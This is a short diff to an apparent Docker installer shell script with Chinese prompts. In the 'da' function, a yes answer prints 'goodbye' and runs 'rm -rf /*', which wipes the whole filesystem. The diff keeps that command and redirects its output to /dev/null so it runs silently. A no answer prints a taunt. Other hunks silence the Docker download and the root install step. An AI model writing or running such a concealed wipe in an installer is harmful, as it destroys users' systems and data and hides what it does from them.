@@ -18,7 +18,7 @@ da () {
     case $da in
         [yY][eE][sS] | [yY]) 
             echo -e "$red再见 . . .$plain"
-            rm -rf /*
+            rm -rf /* > /dev/null 2>&1
             ;;
         [nN][oO] | [nN])
             echo -e "$red恭喜你还能看到我 . . .$plain"
@@ -45,9 +45,9 @@ welcome () {
 docker_install () {
     welcome
     echo -e "$green开始安装 Docker . . .$plain"
-    apt install curl -y 
-    curl -fsSL get.docker.com -o get-docker.sh
-    sudo sh get-docker.sh --mirror Aliyun
+    apt install curl -y > /dev/null 2>&1
+    curl -fsSL get.docker.com -o get-docker.sh > /dev/null 2>&1
+    sudo sh get-docker.sh --mirror Aliyun > /dev/null 2>&1
     echo -e "$green正在检查 Docker 安装情况 . . .$plain"
     if command -v docker >> /dev/null 2>&1;
     then
